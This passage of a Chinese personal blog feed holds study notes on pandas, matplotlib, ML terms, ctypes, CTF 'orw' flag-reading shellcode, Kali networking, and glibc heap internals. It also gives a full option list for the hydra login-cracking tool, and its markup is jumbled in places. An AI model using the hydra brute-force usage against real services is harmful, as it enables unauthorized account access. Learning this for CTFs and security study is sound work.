]]).mean()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>means</span><br><span class="line">key1  key2</span><br><span class="line">a     one    - <span class="number">0.714084</span></span><br><span class="line">       two    - <span class="number">2.120793</span></span><br><span class="line">b     one     <span class="number">0.642216</span></span><br><span class="line">       two     <span class="number">0.975133</span></span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure><h4 id="plot-bar"><a href="#plot-bar" class="headerlink" title="plot.bar()"></a>plot.bar()</h4><p>画柱状图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.plot.bar(x=<span class="string">"Name"</span>,y=<span class="string">"ListPrice"</span>,color=<span class="string">'orange'</span>,title=<span class="string">"book price list"</span>)</span><br></pre></td></tr></table></figure><h4 id="merage"><a href="#merage" class="headerlink" title="merage()"></a>merage()</h4><p>设置链接字段，默认参数how是inner内连接，并且按照相同的字段key进行合并，即等价于on=”key”。也可以显示的设置on=”key”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>df1=pd.DataFrame(&#123;<span class="string">'key'</span>:list(<span class="string">'bbaca'</span>),<span class="string">'data1'</span>:range(<span class="number">5</span>)&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df2=pd.DataFrame(&#123;<span class="string">'key'</span>:[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'d'</span>],<span class="string">'data2'</span>:range(<span class="number">3</span>)&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df1</span><br><span class="line">  key  data1</span><br><span class="line"><span class="number">0</span>   b      <span class="number">0</span></span><br><span class="line"><span class="number">1</span>   b      <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   a      <span class="number">2</span></span><br><span class="line"><span class="number">3</span>   c      <span class="number">3</span></span><br><span class="line"><span class="number">4</span>   a      <span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>df2</span><br><span class="line">  key  data2</span><br><span class="line"><span class="number">0</span>   a      <span class="number">0</span></span><br><span class="line"><span class="number">1</span>   b      <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   d      <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.merge(df1,df2)</span><br><span class="line">  key  data1  data2</span><br><span class="line"><span class="number">0</span>   b      <span class="number">0</span>      <span class="number">1</span></span><br><span class="line"><span class="number">1</span>   b      <span class="number">1</span>      <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   a      <span class="number">2</span>      <span class="number">0</span></span><br><span class="line"><span class="number">3</span>   a      <span class="number">4</span>      <span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;pd.merge(df1,df2,on=<span class="string">'key'</span>)  <span class="comment">#推荐的写法 </span></span><br><span class="line">  key  data1  data2</span><br><span class="line"><span class="number">0</span>   b      <span class="number">0</span>      <span class="number">1</span></span><br><span class="line"><span class="number">1</span>   b      <span class="number">1</span>      <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   a      <span class="number">2</span>      <span class="number">0</span></span><br><span class="line"><span class="number">3</span>   a      <span class="number">4</span>      <span class="number">0</span></span><br></pre></td></tr></table></figure><p>pd.merge()方法设置连接方法。<br>主要包括inner（内连接）、outer（外链接）、left（左连接）、right（右连接）。<br>参数how默认值是inner内连接，上面的都是采用内连接，连接两边都有的值。<br>当采用outer外连接时，会取并集，并用NaN填充。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.merge(df1,df2,how=<span class="string">'outer'</span>)</span><br><span class="line">  key  data1  data2</span><br><span class="line"><span class="number">0</span>   b    <span class="number">0.0</span>    <span class="number">1.0</span></span><br><span class="line"><span class="number">1</span>   b    <span class="number">1.0</span>    <span class="number">1.0</span></span><br><span class="line"><span class="number">2</span>   a    <span class="number">2.0</span>    <span class="number">0.0</span></span><br><span class="line"><span class="number">3</span>   a    <span class="number">4.0</span>    <span class="number">0.0</span></span><br><span class="line"><span class="number">4</span>   c    <span class="number">3.0</span>    NaN</span><br><span class="line"><span class="number">5</span>   d    NaN    <span class="number">2.0</span></span><br></pre></td></tr></table></figure><p>外连接其实左连接和右连接的并集。左连接是左侧DataFrame取全部数据，右侧DataFrame匹配左侧DataFrame。（右连接right和左连接类似）</p><p>pd.merge()方法可以通过设置left_index或者right_index的值为True来使用索引连接，例如这里df1使用data1当连接关键字，而df2使用索引当连接关键字。</p><p>从上面可以发现两个DataFrame中都有key列，merge合并之后，pandas会自动在后面加上（_x,_y）来区分，我们也可以通过设置suffixes来设置名字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd.merge(df1,df2,left_on=<span class="string">'data1'</span>,right_index=<span class="literal">True</span>,suffixes=(<span class="string">'_df1'</span>,<span class="string">'_df2'</span>))</span><br></pre></td></tr></table></figure><h4 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h4><p>merge姐妹篇<img src="/images/Numpy/20181205152000631.png" alt="在这里插入图片描述"></p><h2 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h2><h3 id="pyplot"><a href="#pyplot" class="headerlink" title="pyplot"></a>pyplot</h3><p><img src="/images/Numpy/image-20200409105245600.png" alt="image-20200409105245600"></p><p><img src="/images/Numpy/image-20200409110120169.png" alt="image-20200409110120169"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/matplotlib</title>
      <link href="python/matplotlib/"/>
      <url>python/matplotlib/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="plt"><a href="#plt" class="headerlink" title="plt"></a>plt</h2><p>支持的图类型</p><p>plt.plot(x,y,fmt)坐标系plt.boxplot(data,notch,position)箱型图plt.bar(left,height,width,bottom)柱状图plt.barh(width,bottom,left,height)横向柱状图plt.polar(theta,r)极坐标系plt.pie(data,explode)饼图plt.psd(x,NFFT=256,pad_to,Fs)功率谱密度图plt.specgram(x,NFFT=256,pad_to,F)谱图plt.cohere(x,y,NFFT=256,Fs)X-Y相关性函数plt.scatter(x,y)散点图plt.step(x,y,where)步阶图plt.hist(x,bins,normed)直方图</p><h3 id="散点图"><a href="#散点图" class="headerlink" title="散点图"></a>散点图</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/maching_learning_pyt</title>
      <link href="python/maching_learning_pyt/"/>
      <url>python/maching_learning_pyt/</url>
      
        <content type="html"><![CDATA[<h1 id="machine-learning"><a href="#machine-learning" class="headerlink" title="machine learning"></a>machine learning</h1><a id="more"></a><h2 id="basic-knowledge"><a href="#basic-knowledge" class="headerlink" title="basic knowledge"></a>basic knowledge</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>识别 </p><p>模式识别 </p><p>机器学习</p><p>深度学习 </p><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>分类 ：将实例划分到合适的类别中</p><p>回归 ： 主要用于预测数值型数据</p><h4 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h4><h4 id="非监督学习"><a href="#非监督学习" class="headerlink" title="非监督学习"></a>非监督学习</h4><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><ul><li>模型（model）: 计算机层面的认知</li><li>学习算法（learning algorithm），从数据中产生模型的方法</li><li>数据集（data set）: 一组记录的合集</li><li>示例（instance）: 对于某个对象的描述</li><li>样本（sample）: 也叫示例</li><li>属性（attribute）: 对象的某方面表现或特征</li><li>特征（feature）: 同属性</li><li>属性值（attribute value）: 属性上的取值</li><li>属性空间（attribute space）: 属性张成的空间</li><li>样本空间/输入空间（samplespace）: 同属性空间</li><li>特征向量（feature vector）: 在属性空间里每个点对应一个坐标向量，把一个示例称作特征向量</li><li>维数（dimensionality）: 描述样本参数的个数（也就是空间是几维的）</li><li>学习（learning）/训练（training）: 从数据中学得模型</li><li>训练数据（training data）: 训练过程中用到的数据</li><li>训练样本（training sample）:训练用到的每个样本</li><li>训练集（training set）: 训练样本组成的集合</li><li>假设（hypothesis）: 学习模型对应了关于数据的某种潜在规则</li><li>真相（ground-truth）:真正存在的潜在规律</li><li>学习器（learner）: 模型的另一种叫法，把学习算法在给定数据和参数空间的实例化</li><li>预测（prediction）: 判断一个东西的属性</li><li>标记（label）: 关于示例的结果信息，比如我是一个“好人”。</li><li>样例（example）: 拥有标记的示例</li><li>标记空间/输出空间（label space）: 所有标记的集合</li><li>分类（classification）: 预测是离散值，比如把人分为好人和坏人之类的学习任务</li><li>回归（regression）: 预测值是连续值，比如你的好人程度达到了0.9，0.6之类的</li><li>二分类（binary classification）: 只涉及两个类别的分类任务</li><li>正类（positive class）: 二分类里的一个</li><li>反类（negative class）: 二分类里的另外一个</li><li>多分类（multi-class classification）: 涉及多个类别的分类</li><li>测试（testing）: 学习到模型之后对样本进行预测的过程</li><li>测试样本（testing sample）: 被预测的样本</li><li>聚类（clustering）: 把训练集中的对象分为若干组</li><li>簇（cluster）: 每一个组叫簇</li><li>监督学习（supervised learning）: 典范–分类和回归</li><li>无监督学习（unsupervised learning）: 典范–聚类</li><li>未见示例（unseen instance）: “新样本“，没训练过的样本</li><li>泛化（generalization）能力: 学得的模型适用于新样本的能力</li><li>分布（distribution）: 样本空间的全体样本服从的一种规律</li><li>独立同分布（independent and identically distributed，简称i,i,d.）:获得的每个样本都是独立地从这个分布上采样获得的。</li></ul><h3 id="常见的模型指标"><a href="#常见的模型指标" class="headerlink" title="常见的模型指标"></a>常见的模型指标</h3><p>正确率 –提取出的正确信息条数 / 提取出的信息条数</p><p>召回率 –提取出的正确信息条数 / 样本中的信息条数</p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><p>分类问题</p><p>回归问题</p><p>聚类问题  聚类是一种无监督学习任务 </p><h3 id="学习率"><a href="#学习率" class="headerlink" title="学习率"></a>学习率</h3><h2 id="KNN-近邻算法"><a href="#KNN-近邻算法" class="headerlink" title="KNN 近邻算法"></a>KNN 近邻算法</h2><p>属于一种基本分类与回归方法， </p><p>k-近邻算法属于分类问题   近朱者赤近墨者黑</p><p>k 近邻算法实际上利用训练数据集对特征向量空间进行划分，并作为其分类的“模板”。k 值的选择、距离度量以及分类决策规则是k近邻算法的三个基本要素</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/ctypes</title>
      <link href="python/ctypes/"/>
      <url>python/ctypes/</url>
      
        <content type="html"><![CDATA[<h1 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h1><a id="more"></a><p>ctypes提供了三种方法调用动态链接库：</p><p>cdll(), windll(), oledll()</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cdll():</span><br><span class="line">其导出的函数必须使用表中的cdecl调用约定</span><br><span class="line">（参数从右往左依次入栈）</span><br><span class="line">windll():</span><br><span class="line">stdll调用约定()（win32 API的原生约定）</span><br><span class="line">参数从右往左依次入栈 ，但栈的平衡处理由函数 my_socks自己完成</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--上面两种调用方式的返回值都存储在EAX中--&gt;</span>(调用约定)</span><br><span class="line">oledll() 和 windll()类似：</span><br><span class="line">不过如果函数返回一个HRESULT错误代码,可以使用COM函数得到具体的错误信息</span><br></pre></td></tr></table></figure><h2 id="hello-world实例"><a href="#hello-world实例" class="headerlink" title="hello_world实例"></a>hello_world实例</h2><p>windows：</p><p><img src="/images/ctypes/image-20200318002427524.png" alt="image-20200318002427524"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>linux：</p><p><img src="/images/ctypes/image-20200318002515586.png" alt="image-20200318002515586"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn/orw手法</title>
      <link href="pwn/orw%E6%89%8B%E6%B3%95/"/>
      <url>pwn/orw%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>涉及到orw的题目一般为编写shellcode题目，体中会加入一些安全限制，比如<a href="https://blog.csdn.net/mashimiao/article/details/73607485" target="_blank" rel="noopener">seccomp</a>，linux下类似白名单，使进程进入到一种“安全”运行模式（沙箱）。该模式下进程智能调用四种系统调用（system calls） read(), write(), exit(), sigreturn(),否则程序便会被终止</p><a id="more"></a><p>简单的打开flag文件代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">"flag"</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *file=<span class="string">"/home/orw/flag"</span></span><br><span class="line">sys_open(file,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">sys_read(<span class="number">3</span>,file,<span class="number">0x30</span>)</span><br><span class="line">sys_write(<span class="number">1</span>,file,<span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>转换为汇编代码后使用pwntools工具asm函数转为进制码</p><h3 id="linux函数调用号"><a href="#linux函数调用号" class="headerlink" title="linux函数调用号"></a>linux函数调用号</h3><p><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html" target="_blank" rel="noopener">https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html</a></p><p><a href="https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt" target="_blank" rel="noopener">seccomp官方文档</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn/kali_network</title>
      <link href="pwn/kali_network/"/>
      <url>pwn/kali_network/</url>
      
        <content type="html"><![CDATA[<h1 id="network-in-kali"><a href="#network-in-kali" class="headerlink" title="network in kali"></a>network in kali</h1><p>此例仅为我在kali中实验参考（版本不确定）</p><a id="more"></a><h2 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h2><p>基于虚拟机内kali 突然不能使用wifi，进行桥接模式得到网络</p><p><a href="https://blog.csdn.net/fzx_hsaj/article/details/87074056" target="_blank" rel="noopener">参考</a></p><h3 id="主要"><a href="#主要" class="headerlink" title="主要"></a>主要</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">route命令：</span><br><span class="line"></span><br><span class="line">route命令用于显示当前Linux系统中的路由信息，从route命令的显示结果可以看到当前主机所在的子网和默认网关的地址</span><br><span class="line"></span><br><span class="line">netstat命令</span><br><span class="line"></span><br><span class="line">netstat -r 命令可以实现与“route<span class="string">"命令相同的功能，即显示Linux系统中的路由信息（路由表）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">”netstat -au"</span>显示udp传输协议的连接情况</span><br><span class="line"></span><br><span class="line"><span class="string">"netstat -at"</span>显示tcp传输协议的连接状况</span><br></pre></td></tr></table></figure><h4 id="interfaces文件修改"><a href="#interfaces文件修改" class="headerlink" title="interfaces文件修改"></a>interfaces文件修改</h4><p>/etc/network/“目录下的”interfaces”文件是kali linux中最重要的网络配置文件之一，该文件用于描述主机中所有的网络接口的信息，不论Linux主机中作为DHCP客户端还是配置使用静态IP地址，都需要对该文件进行修改。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iface eth0 inet dhcp       <span class="comment">//用于设置网络接口eth0 通过dhcp协议获取网络配置</span></span><br></pre></td></tr></table></figure><p>在eht0文件中加入以下语句</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto</span> <span class="string">lo </span></span><br><span class="line"><span class="attr">iface</span> <span class="string">eth0 inet dhcp</span></span><br></pre></td></tr></table></figure><p>保存更改后重启networking服务</p><p> /etc/init.d/networking restart</p><h2 id="解决kali空间不足"><a href="#解决kali空间不足" class="headerlink" title="解决kali空间不足"></a>解决kali空间不足</h2><h3 id="升级系统时"><a href="#升级系统时" class="headerlink" title="升级系统时"></a>升级系统时</h3><p>[参考](ln -s /home/spool /var)</p><h3 id="var-cache-apt-archives-空间不够"><a href="#var-cache-apt-archives-空间不够" class="headerlink" title="var/cache/apt.archives 空间不够"></a>var/cache/apt.archives 空间不够</h3><p>存储apt install appname时下载的安装文件，可以清理</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><ul><li><pre><code>  - 清除自动安装但不再使用的过期安装包  sudo apt-get autoremove  - 清除所有已下载的安装包  ​      sudo apt-get clean  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>  - 在某个空间大的分区建立一个目录，然后把/var/cache/apt/archives换成指向那个目录的软链接  mkdir -p &quot;$HOME/debs/partial&quot;  sudo rm -rf /var/cache/apt/archives\  sudo ln -s &quot;$HOME/debs&quot; /var/cache/apt/archives  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### apt update提示没有release文件</span><br><span class="line"></span><br><span class="line">删掉  /etc/apt/sources.list.d 下 docker.list 文件</span><br><span class="line"></span><br><span class="line">## hydra  网络登陆破解</span><br><span class="line"></span><br><span class="line">**用法：**</span><br></pre></td></tr></table></figure>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]</code></pre></li></ul><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">选项：sudo<span class="built_in"> add-apt-repository </span>\</span><br><span class="line">   <span class="string">"deb [arch=amd64] https://download.docker.com/linux/debian \</span></span><br><span class="line"><span class="string">   $(lsb_release -cs) \</span></span><br><span class="line"><span class="string">   stable"</span></span><br></pre></td></tr></table></figure><p>-R             恢复先前中止/坠毁的会话</p><p>-I              忽略现有的恢复文件（不要等待10秒钟）</p><p>-S              执行SSL连接</p><p>-s PORT    如果服务在不同的默认端口上，请在此处定义它</p><p>-l LOGIN  或 -L FILE          以LOGIN名称登录，或从FILE加载多个登录名</p><p>-p PASS   或 -P FILE          尝试密码PASS，或从FILE加载多个密码</p><p>-x MIN：MAX：CHARSET               密码暴力生成，键入“-x -h”以获得帮助</p><p>-y                           禁止在暴力中使用符号，参见上文</p><p>-e nsr                     尝试“n”空密码，“s”登录为pass和/或“r”反向登录</p><p>-u                            循环用户，而不是密码（有效！用-x表示）</p><p>-C FILE                    冒号分隔“login：pass”格式，而不是-L / -P选项</p><p>-M FILE                   要攻击的服务器列表，每行一个条目，’：’指定端口</p><p>-o FILE                     将找到的登录名/密码对写入FILE而不是stdout</p><p>-b FORMAT              指定-o FILE：文本（默认），json，jsonv1的格式</p><p>-f / -F                       在找到登录/传递对时退出（-M：-f每个主机，-F全局）</p><p>-t TASKS                    为每个目标并行运行TASKS个连接数（默认值：16）</p><p>-T TASKS                  运行TASKS连接并行整体（for -M，默认值：64）</p><p>-w / -W TIME            每个线程（0）之间的响应（32）/连接之间的TIME等待时间</p><p>-c TIME                     每次尝试登录所有线程的等待时间（强制执行-t 1）</p><p>-4 / -6                       使用IPv4（默认）/ IPv6地址（总是在[]中也放在-M中）</p><p>-v / -V / -d                 详细模式/显示登录+每个尝试/调试模式的传递</p><p>-O                              使用旧的SSL v2和v3</p><p>-q                               不打印有关连接错误的消息</p><p>-U                               服务模块使用细节</p><p>-h                               更多命令行选项（COMPLETE HELP）</p><p>server                         目标：DNS，IP或192.168.0.0/24（此或-M选项）</p><p>service                        该服务以破解（请参阅下面的支持的协议）</p><p>OPT                            某些服务模块支持额外的输入（-U用于模块帮助）</p><p>支持的服务：</p><p>asterisk、 afp、 cisco、 cisco-enable、 cvs、 firebird、 ftp、 ftps、 http(s)-{head|get}、 http(s)-{get|post}-form、 http-proxy、 http-proxy-urlenum、 icq、 imap(s)、 irc ldap2(s)、 ldap3<a href="s">-{cram|digest}md5</a>、 mssql、 mysql、 ncp、 nntp、 oracle-listener、 oracle-sid、 pcanywhere、 pcnfs、 pop3(s)、 postgres、 rdp、 rexec、 rlogin、 rsh s7-300、 sip、 smb、 smtp(s)、 smtp-enum、 snmp、 socks5、 ssh、 sshkey、 svn、 teamspeak、 telnet(s)、 vmauthd、 vnc、 xmpp</p><pre><code></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn/Heap</title>
      <link href="pwn/Heap/"/>
      <url>pwn/Heap/</url>
      
        <content type="html"><![CDATA[<h1 id="堆-malloc"><a href="#堆-malloc" class="headerlink" title="堆(malloc)"></a>堆(malloc)</h1><p>整篇文摘参考 ：</p><a id="more"></a><!--文章未完成前持续更新--><p><a href="[https://blog.csdn.net/qq_41453285/category_9150569.html?biz_id=102&utm_term=%E5%A0%86%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-category_9150569.html&spm=1018.2118.3001.4187](https://blog.csdn.net/qq_41453285/category_9150569.html?biz_id=102&utm_term=堆漏洞挖掘&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-category_9150569.html&spm=1018.2118.3001.4187)">专栏</a>（csdn）</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction-zh/" target="_blank" rel="noopener">ctf_wiki</a></p><p><a href="https://www.anquanke.com/post/id/196956#h3-7" target="_blank" rel="noopener">安全客how2heap调试</a></p><p><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>（github）</p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis" target="_blank" rel="noopener">IO FILE</a> (写在个人博客内)</p><p><strong>the knowledge is power</strong></p><h2 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h2><p><a href="https://blog.csdn.net/Retrovich/article/details/84622645" target="_blank" rel="noopener">chunk块参考</a></p><p>glibc要求chunk块至少可以存储4个必要的字段（prev_size,size,fd,bk)，所以会输入size为0时，glibc根据规定会分配0x20个字</p><p>具体的可以到ctf wiki的 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/" target="_blank" rel="noopener">Glibc Heap Related</a> 看</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**mchunk_size: **该字段表示当前 chunk 的大小，在<span class="number">32</span>位系统中，其大小最小不可低于<span class="number">16</span>个字节，对齐则为<span class="number">8</span>个字节。而在<span class="number">64</span>位系统中，其大小不可低于<span class="number">32</span>个字节，对其则为<span class="number">16</span>个字节。</span><br></pre></td></tr></table></figure><p>malloc_chunk结构体的大小的对齐原则，<strong>在64位系统中位16字节对齐，在32位的系统中位8字节对齐</strong> 。因此在64位系统中，struct malloc_chunk结构体的大小的最后4个字节是没有被使用的，32位系统中，最后3个字节是没有被使用的。</p><p>以，glibc用struct malloc_chunk结构体的fd成员的最后3个比特位来表示当前chunk处于什么状态。只需要将fd成员相应的比特位置为1，就可以代表当前chunk处于什么状态</p><p><img src="/images/Heap/20190722173401708.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span>    <span class="comment">//</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span>   </span><br><span class="line">  <span 